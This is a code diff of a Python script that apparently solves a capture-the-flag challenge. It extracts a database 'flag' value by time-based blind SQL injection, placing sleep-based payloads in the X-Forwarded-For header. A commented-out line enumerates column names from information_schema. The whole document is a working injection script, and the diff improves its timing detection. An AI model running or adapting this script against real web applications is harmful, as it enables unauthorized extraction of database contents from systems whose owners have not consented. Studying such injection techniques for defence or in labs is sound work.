@@ -2,7 +2,8 @@
 """
 @author: seck
 """
-import requests;
+import requests
+import time
 maystr="0987654321qwertyuiopasdfghjklzxcvbnm."
 flag=''
 for j in range(33):
@@ -15,11 +16,10 @@ for j in range(33):
             #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i) #跑字段名
             "X-Forwarded-For":"' +(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑记录
         }
-        try:
-
-            res=requests.get(url, headers=header,timeout=4).text
-        except:
-
-             flag+=i
-             print flag
+        start_time = time.time()
+        res=requests.get(url, headers=header,timeout=10).text
+        print ".",
+        if time.time()-start_time>4:
+            flag+=i
+            print flag
         # print res
